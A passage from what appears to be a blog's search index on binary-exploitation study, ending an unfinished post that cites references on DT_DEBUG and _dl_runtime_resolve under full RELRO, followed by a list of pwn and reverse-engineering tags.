有aslr的情况。。 我也不会。 4)refrence通过DT_DEBUG来获得各个库的基址 How the ELF Ruined Christmas Finding link_map and _dl_runtime_resolve() under full RELRO ————————————————tbc——————————————————-","categories":[],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]}],"categories":[],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"},{"name":"逆向","slug":"逆向","permalink":"https://fuurinko.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"heap_pro","slug":"heap-pro","permalink":"https://fuurinko.github.io/tags/heap-pro/"},{"name":"csapp lab","slug":"csapp-lab","permalink":"https://fuurinko.github.io/tags/csapp-lab/"},{"name":"SRE","slug":"SRE","permalink":"https://fuurinko.github.io/tags/SRE/"},{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"},{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"},{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"},{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"},{"name":"format","slug":"format","permalink":"https://fuurinko.github.io/tags/format/"},{"name":"pwntools","slug":"pwntools","permalink":"https://fuurinko.github.io/tags/pwntools/"},{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"},{"name":"pwn Primary","slug":"pwn-Primary","permalink":"https://fuurinko.github.io/tags/pwn-Primary/"},{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"},{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]}